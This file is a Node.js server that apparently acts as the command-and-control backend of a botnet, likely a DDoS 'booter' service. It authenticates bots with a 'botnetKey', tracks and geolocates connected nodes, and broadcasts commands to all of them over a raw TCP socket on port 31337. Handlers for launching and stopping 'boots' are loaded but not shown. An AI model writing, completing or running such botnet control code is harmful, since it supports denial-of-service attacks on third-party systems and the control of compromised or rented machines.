// Configuration
const config = require('./config.json')

// Loading up dependancies
const express = require('express');
const helmet = require('helmet');
const path = require('path')
const axios = require('axios');
const EventEmitter = require('events');

const { connect } = require('mongoose');

// Starting our app
const app = express()

const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

// Socket
var net = require('net');
let sockets = []; // array of sockets
let socketsInfo = [];

// emmit data to all connected clients
const broadcast = (msg) => {
    //Loop through the active clients object
    sockets.forEach((client) => {
        client.write(JSON.stringify(msg) + `\n`)
    });
};

function IsJsonString(str) {
    try {
        JSON.parse(str);
    } catch (e) {
        return false;
    }
    return true;
}

function findElement(arr, propName, propValue) {
  for (var i=0; i < arr.length; i++)
    if (arr[i][propName] == propValue)
      return arr[i];

}

var server = net.createServer( (socket) => {
	socket.on('connection', () => {
		console.log('NEW CONN: ' + socket.remoteAddress.slice(7))
	})
	socket.on('error', (errox) => {
		console.log('CONN ERROR(' + socket.remoteAddress.slice(7) + '): ' + errox.message)
        try {
		    let index = sockets.indexOf(socket);
	        if (index !== -1) {
	            sockets.splice(index, 1);
	        }
        	for (let [i, serv] of socketsInfo.entries()) {
				if (serv.id == socket) {
					socketsInfo.splice(i, 1);
				}
			}
	        socket.end()
        	socket.destroy()
        } catch (err) {
        	// Do something
        }

	})
	socket.on('data', async (msg) => {
		let trueMsg  ={ type : 'none' }
		if(IsJsonString(msg) && msg) 
			trueMsg = JSON.parse(msg)
		if(trueMsg && trueMsg.type === 'connect') {
			if(trueMsg.apiKey === config.botnetKey) {
				const socketIp = socket.remoteAddress.slice(7)
				console.log('NEW AUTHENTICATED CONN: ' + socket.remoteAddress.slice(7))
				const foundSocket = findElement(socketsInfo, 'ip', socketIp)
				if(foundSocket && foundSocket.node == trueMsg.mainNode) {
					console.log('CONN ENDED FOR DUPLICATE IP ' + socketIp)
					socket.end()
					socket.destroy()
				} else {
					sockets.push(socket)
					try {
						const response = await axios.get('http://ip-api.com/json/' + socketIp)
						if(response.data.status === "success") {
							socketsInfo.push({
								id: socket,
								ip: socketIp,
								countrycode: response.data.countryCode,
								org: response.data.org,
								node: trueMsg.mainNode,
								connected: new Date()
							})
						} else {
							socketsInfo.push({
								id: socket,
								ip: socketIp,
								org: 'Unknown',
								countrycode: 'US',
								node: trueMsg.mainNode,
								connected: new Date()
							})
						}

					} catch {
						socketsInfo.push({
							id: socket,
							ip: socketIp,
							org: 'Unknown',
							countrycode: 'US',
							node: trueMsg.mainNode,
							connected: new Date()
						})
					}
				}
			}
		}
	})
	socket.on('end', () => {
		console.log('CONN ENDED: ' + socket.remoteAddress.slice(7))
        try {
		    let index = sockets.indexOf(socket);
	        if (index !== -1) {
	            sockets.splice(index, 1);
	        }
        	for (let [i, serv] of socketsInfo.entries()) {
				if (serv.id == socket) {
					socketsInfo.splice(i, 1);
				}
			}
        } catch (err) {
        	// Do something
        }
    });
});

// Port
const port = process.env.PORT || 5000

// Middlewares
app.use(helmet())
app.use(require('express-useragent').express())

app.use(express.urlencoded({ extended: true }))
app.use('/', express.static(path.join(__dirname, 'public')))


app.use(function (req, res, next) {
	res.setHeader('Access-Control-Allow-Origin', '*');
	res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
	res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type,authorizationToken');
	res.setHeader('Access-Control-Allow-Credentials', true);
	next();
})


// Bodyparser equivilant 
app.use(express.json())

// Loading our routes
require('./routes')(app, server, broadcast, socketsInfo);

// Error Handing for next()
require('./handlers/error')(app);

// Handlers for socket server
require('./handlers/server')(server);

// Crontab for all updates
require('./handlers/all')(broadcast);

// Stop ongoing boots 
require('./handlers/stop')();

// Initializing the App
( async () => {
	await connect(config.mongodbURL, {
		useFindAndModify : false,
		useUnifiedTopology : true,
		useNewUrlParser : true
	})
	await app.listen(port, (err) => {
		if(err)
			return console.log(`An error has occurred : ${err}`)
		console.log(`Backend running with no issue.`)
	})

	server.listen(31337);
} ) () ;

